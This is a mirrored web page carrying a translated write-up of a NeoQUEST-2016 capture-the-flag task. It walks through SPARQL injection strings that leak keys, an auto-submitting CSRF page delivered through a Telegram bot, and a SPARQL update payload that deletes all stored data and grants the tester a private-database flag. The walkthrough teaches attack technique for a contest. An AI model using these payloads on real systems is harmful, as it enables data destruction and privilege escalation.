<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>You Telegramma: SPARQL-injections and CSRF via Telegram-messages in the NeoQUEST-2016 task</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Less than a month is left before the ‚Äúconfrontation‚Äù NeoQUEST-2016. It will be held in St. Petersburg on July 7, the entrance is traditionally free, y...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>You Telegramma: SPARQL-injections and CSRF via Telegram-messages in the NeoQUEST-2016 task</h1><div class="post__text post__text-html js-mediator-article"><img align="left" src="https://habrastorage.org/files/015/ad4/b46/015ad4b46f7442de83f88d7ba51c98af.png">  Less than a month is left before the ‚Äúconfrontation‚Äù NeoQUEST-2016.  It will be held in St. Petersburg on July 7, the entrance is traditionally free, you just need to register on the <a href="http://neoquest.ru/">site</a> !  Reports, contests, demonstrations of attacks, Twitter quiz - all this (and not only!) Awaits the guests of the event from 11:00 to 18:00 at the CDC <a href="http://club-house.org/contact-us/">"Club House"</a> . <br><br>  In the meantime, another analysis of the NeoQUEST-2016 online stage arrived, and this time we will talk about SPARQL injections and CSRF attacks via Telegram messages.  The task contained 3 different keys, one key was obtained using a SPARQL injection in the user ID query, the second and third keys were obtained using an injection and a CSRF attack. <br><a name="habracut"></a><br><h4>  <b>Initial data to the task</b> </h4><br>  The initial data for the participants were the URL of the site and the ID of the bot for Telegram. <br>  When you first visited the site, the user was given the opportunity to login / register.  After the participants registered and logged in to the site, they opened a small chat interface, where they could send messages to a common board.  Also, each participant saw his ID and the inscription ‚ÄúPrivate DB: no‚Äù, from which it could be concluded that they did not have access to the private database. <br><br><img src="https://habrastorage.org/files/144/6e7/a83/1446e7a83632433db4d1e0c3680ef6f3.png">
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
      Most of the participants immediately sought to communicate with the bot for Telegram, but he was not a particularly talkative guy and most often answered something like "Hi how are you?".  Therefore, participants quickly left him alone and continued to explore the site. <br><br><h4>  <b>First key: implement a SPARQL injection</b> </h4><br>  If you go to the site and open the ‚ÄúNetwork‚Äù tab in the browser‚Äôs developer tools, you could see the following access to the server: <br><br><img src="https://habrastorage.org/files/959/29f/e1b/95929fe1b4d0470ebff71b11eb63790f.png"><br><br>  The most interesting request is ‚Äúget-id‚Äù, which receives the current user ID from the server.  The logical action was an attempt to test the parameters on the injection.  If you copy the query into ‚ÄúcURL‚Äù (in the Chrome context menu ‚ÄúCopy as cURL‚Äù) and run, you get the following result: <br><br><img src="https://habrastorage.org/files/24b/a61/3da/24ba613da4ab414c85021a34cdbe2288.png"><br><br>  The input parameters of the query "type" and "user".  And what if to substitute the character "'" in the field? User?  The server returned an error of the form: <br><br><pre><code class="hljs pgsql">Lexical error at <span class="hljs-type"><span class="hljs-type">line</span></span> <span class="hljs-number"><span class="hljs-number">2</span></span>, <span class="hljs-keyword"><span class="hljs-keyword">column</span></span> <span class="hljs-number"><span class="hljs-number">40.</span></span> Encountered: &lt;EOF&gt; <span class="hljs-keyword"><span class="hljs-keyword">after</span></span> : "\' :hasId ?id }"</code> </pre> <br><br>  We look through various symbols, and for the request with the symbol ‚Äú&lt;‚Äù at the end of the user name we get the following answer: <br><br><pre> <code class="hljs erlang">Encountered <span class="hljs-string"><span class="hljs-string">" "</span></span>&lt;<span class="hljs-string"><span class="hljs-string">" "</span></span>&lt; <span class="hljs-string"><span class="hljs-string">""</span></span> at line <span class="hljs-number"><span class="hljs-number">2</span></span>, column <span class="hljs-number"><span class="hljs-number">26</span></span>. Was expecting one <span class="hljs-keyword"><span class="hljs-keyword">of</span></span>: <span class="hljs-string"><span class="hljs-string">"("</span></span> ... <span class="hljs-string"><span class="hljs-string">"!"</span></span> ... <span class="hljs-string"><span class="hljs-string">"^"</span></span> ... <span class="hljs-string"><span class="hljs-string">"a"</span></span> ... &lt;Q_IRI_REF&gt; ... &lt;PNAME_NS&gt; ... &lt;PNAME_LN&gt; ... &lt;VAR1&gt; ... &lt;VAR2&gt; ...</code> </pre><br><br>  After a bit of searching around the Internet, the participants concluded that the server uses a database to store triplets, and the database query language is nothing more than SPARQL.  Judging by the error, it was possible to understand that the parameter is not filtered, which means that a SPARQL injection can be performed! <br><br>  You can read more about what a SPARQL injection is <a href="https://www.w3.org/TR/sparql11-update/">here</a> and <a href="http://www.morelab.deusto.es/code_injection/">here</a> .  Its essence is that the body of the request from external data, besides the necessary (such as, for example, user id), can get the code that complements the request.  A simple example of a SPARQL query is as follows: <br><br><pre> <code class="sql hljs"><span class="hljs-keyword"><span class="hljs-keyword">select</span></span> ?pass <span class="hljs-keyword"><span class="hljs-keyword">where</span></span> { &lt;urn:user1&gt; &lt;urn:hasPassword&gt; ?pass }</code> </pre><br><br>  The request means the following: select a password (? Pass - variable), where the subject (&lt;urn: user1&gt;) has a password (predicate &lt;urn: hasPassword&gt;)? Pass.  The '&lt;&gt;' quotes indicate the full URN of the subject and, as in this example, the predicate.  If you specify a prefix, you can refer to subjects and objects without angular quotes. <br><br>  So, the first thing that comes to mind when analyzing the error log ‚Äú: hasId? Id}‚Äù is to substitute the variable ‚Äú? P‚Äù instead of the predicate ‚Äú: hasId‚Äù, and comment out the rest of the query: <br><br><pre> <code class="hljs objectivec">tester ?p ?<span class="hljs-keyword"><span class="hljs-keyword">id</span></span> }<span class="hljs-meta"><span class="hljs-meta">#</span></span></code> </pre><br><br>  As a result of such a query, the predicate name will be returned: &lt;http: //neobit.ru/neoquest#hasId&gt; <br>  To get the next predicate from the list, one could use the limit offset construction: <br><br><pre> <code class="hljs objectivec">tester ?p ?<span class="hljs-keyword"><span class="hljs-keyword">id</span></span> } limit <span class="hljs-number"><span class="hljs-number">1</span></span> offset <span class="hljs-number"><span class="hljs-number">1</span></span><span class="hljs-meta"><span class="hljs-meta">#</span></span></code> </pre><br><br>  Here is the second predicate: &lt;https: //neobit.ru/neoquest#hasFirstKey&gt; <br>  And the third: &lt;https: //neobit.ru/neoquest#hasPrivateDatabase&gt; <br>  The predicate hasFirstKey suggests that this is the first key to the task.  So, you need to get its value: <br><br><pre> <code class="hljs objectivec">tester :hasFirstKey ?<span class="hljs-keyword"><span class="hljs-keyword">id</span></span> }<span class="hljs-meta"><span class="hljs-meta">#</span></span></code> </pre><br><br>  The value "0356c848f23540060a84b453dd9cf0e4" is returned.  The first key is obtained! <br><br><h4>  <b>Second key: we implement CSRF by sending a Telegram message</b> </h4><br>  Just below the form of sending messages to the chat was another form designed to send personal messages to the user.  But unfortunately for the NeoQUEST participants, the fields of this form were not active.  Also in the chat was the tab "Private Messages", inside which is empty.  Obviously, there should have appeared messages addressed to our user. <br><br><img src="https://habrastorage.org/files/b5b/a83/891/b5ba83891deb49829c10ed5e02ff105e.png"><br><br>  Further, it was necessary to find the form code and try to send a message to yourself manually, substituting the login into the ‚ÄúTo User‚Äù field.  Participants sending themselves a message received an error message in response: ‚ÄúOnly administrator can send private messages‚Äù.  This means that only privileged users can send private messages.  It was then that the silent bot was immediately recalled: or maybe he is a user with the privileges we need? <br><br>  By trial and error, the participants discovered that when they sent the bot some link, they received in reply ‚ÄúYour site is very interesting!‚Äù, Which means that the bot visited the site, the link to which was sent to it. <br><br>  It remains to try to use its privileges to send a personal message, conducting the so-called ‚Äúcross-site request forgery‚Äù or CSRF attack!  Learn more about CSRF <a href="https://ru.wikipedia.org/wiki/%25D0%259C%25D0%25B5%25D0%25B6%25D1%2581%25D0%25B0%25D0%25B9%25D1%2582%25D0%25BE%25D0%25B2%25D0%25B0%25D1%258F_%25D0%25BF%25D0%25BE%25D0%25B4%25D0%25B4%25D0%25B5%25D0%25BB%25D0%25BA%25D0%25B0_%25D0%25B7%25D0%25B0%25D0%25BF%25D1%2580%25D0%25BE%25D1%2581%25D0%25B0">here</a> and <a href="https://www.owasp.org/index.php/Cross-Site_Request_Forgery_%2528CSRF%2529">there</a> . <br><br>  This requires any free hosting and a page with a form to send.  The page for operating a CSRF vulnerability may look something like this: <br><br><pre> <code class="html hljs xml"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">html</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">body</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">iframe</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"frame"</span></span></span><span class="hljs-tag">&gt;</span></span><span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">iframe</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">form</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">method</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"post"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">action</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"http://213.170.91.84/users-db/send-message"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">target</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"frame"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">id</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"form"</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">input</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">type</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"hidden"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"title"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">value</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"CSRF"</span></span></span><span class="hljs-tag"> /&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">input</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">type</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"hidden"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"body"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">value</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"CSRF"</span></span></span><span class="hljs-tag"> /&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">input</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">type</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"hidden"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"user"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">value</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"tester"</span></span></span><span class="hljs-tag"> /&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">form</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">script</span></span></span><span class="hljs-tag">&gt;</span></span><span class="javascript"><span class="hljs-built_in"><span class="javascript"><span class="hljs-built_in">document</span></span></span><span class="javascript">.getElementById(</span><span class="hljs-string"><span class="javascript"><span class="hljs-string">'form'</span></span></span><span class="javascript">).submit()</span></span><span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">script</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">body</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">html</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre><br><br>  And then there are two simple steps: send a link to the html file to the bot, go to the ‚ÄúPrivate Messages‚Äù tab - and here it is, the message that came, with the second key ‚Äú9235bfeeb0cf939f4cf5075c9c7e13f8‚Äù in its header! <br><br><h4>  <b>Third Key: Implementing SPARQL via CSRF</b> </h4><br>  NeoQUEST attentive participants quickly recalled that when they received the first key, they saw the predicate &lt;http: //neobit.ru/neoquest#hasPrivateDatabase&gt; in the database.  Its value was set to "0".  So, you can try using the SPARQL injection to set the value to "1". <br><br>  The main form of sending to the general chat is vulnerable, input parameters are not filtered.  Let's form a request to delete all information from the database by substituting the request in the message body: <br><br><pre> <code class="html hljs xml">n"}; delete {?s ?p ?o} where {?s ?p ?o}; insert data {<span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">http:</span></span></span><span class="hljs-tag">//</span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">n</span></span></span><span class="hljs-tag">#</span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">n</span></span></span><span class="hljs-tag">&gt;</span></span><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">http:</span></span></span><span class="hljs-tag">//</span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">n</span></span></span><span class="hljs-tag">#</span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">n</span></span></span><span class="hljs-tag">&gt;</span></span> "n</code> </pre><br><br>  After successful completion of the request, the general chat message should be cleared, all messages have just been deleted from the database. <br>  From the URL it can be seen that the messages were stored in the ‚Äúmessages-db‚Äù database ‚Äúhttp://213.170.91.84/messages-db/send-message‚Äù, while the ‚ÄúhasPrivateDatabase‚Äù flag was stored in the ‚Äúusers-db‚Äù database ‚Äúhttp: //213.170.91.84/users-db/get-id ". <br><br>  When receiving the second key, CSRF was used to send a message on behalf of the administrator via the URL "http://213.170.91.84/users-db/send-message".  This is exactly the base in which you need to make changes.  Having trained on the basis of "messages-db", the participants began to try to make a SPARQL injection through CSRF. <br><br>  Such a request might look something like this: <br><br><pre> <code class="html hljs xml"> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">html</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">body</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">iframe</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"frame"</span></span></span><span class="hljs-tag">&gt;</span></span><span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">iframe</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">form</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">method</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"post"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">action</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"http://213.170.84.29/users-db/send-message"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">target</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"frame"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">id</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"form"</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">input</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">type</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"hidden"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"title"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">value</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"CSRFCSRF"</span></span></span><span class="hljs-tag"> /&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">input</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">type</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">'hidden'</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">'body'</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">value</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">'n"};delete data {:tester :hasPrivateDatabase 0};insert data {:tester :hasPrivateDatabase 1};insert data {&lt;http://n#n&gt;&lt;http://n#n&gt; "n'</span></span></span><span class="hljs-tag"> /&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">input</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">type</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"hidden"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"user"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">value</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"tester"</span></span></span><span class="hljs-tag"> /&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">form</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">script</span></span></span><span class="hljs-tag">&gt;</span></span><span class="javascript"><span class="hljs-built_in"><span class="javascript"><span class="hljs-built_in">document</span></span></span><span class="javascript">.getElementById(</span><span class="hljs-string"><span class="javascript"><span class="hljs-string">'form'</span></span></span><span class="javascript">).submit()</span></span><span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">script</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">body</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">html</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre><br><br>  Then the link was sent to the bot.  If everything was done correctly, then after updating the main page, the participants saw the third key ‚Äúc69d16050cda975cd39de‚Äù and the winning green line ‚ÄúPrivate DB: yes‚Äù! <br><br><img src="https://habrastorage.org/files/902/af9/d81/902af9d812aa405282ad4bbe887983df.png"><br><br>  By the way, one of our participants published a fairly detailed write-up on the passage of this task, you can read <a href="http://sandbox-ctf.com/writeup-neoquest-2016-vam-telegramma/">here</a> . <br><br><h4>  <b>Finally...</b> </h4><br>  Many participants, accustomed to traditional SQL databases, experienced some confusion when faced with a database for storing triplets, the access to which required the use of a special query language SPARQL.  However, it quickly turned out that there is nothing difficult here, and the injection operation here will also be a great success! <br><br>  Ahead - the rest of the analysis of tasks online-stage NeoQUEST-2016, and, of course, the very "confrontation", which will be held July 7 in St. Petersburg!  This year, guests will enjoy an extensive program of reports and many contests in which it will be possible to win great prizes!  Registration is open on <a href="http://neoquest.ru/">the NeoQUEST website</a> , so go ahead! </div><p>Source: <a href="https://habr.com/ru/post/282173/">https://habr.com/ru/post/282173/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../282159/index.html">Profiling JS code from functions. Yandex experience</a></li>
<li><a href="../282161/index.html">GTD: write a thesis and stay alive</a></li>
<li><a href="../282163/index.html">Using arduino to automate device testing</a></li>
<li><a href="../282165/index.html">The results of the selection for the section Young School</a></li>
<li><a href="../282167/index.html">As I wrote the book 'Python Machine Learning'</a></li>
<li><a href="../282175/index.html">ITMO University Digest: # 1 Education and Science</a></li>
<li><a href="../282179/index.html">How I hacked Facebook and found someone else's backdoor</a></li>
<li><a href="../282181/index.html">Features of national management</a></li>
<li><a href="../282183/index.html">3D printer calibration</a></li>
<li><a href="../282187/index.html">VoIP Part 1</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>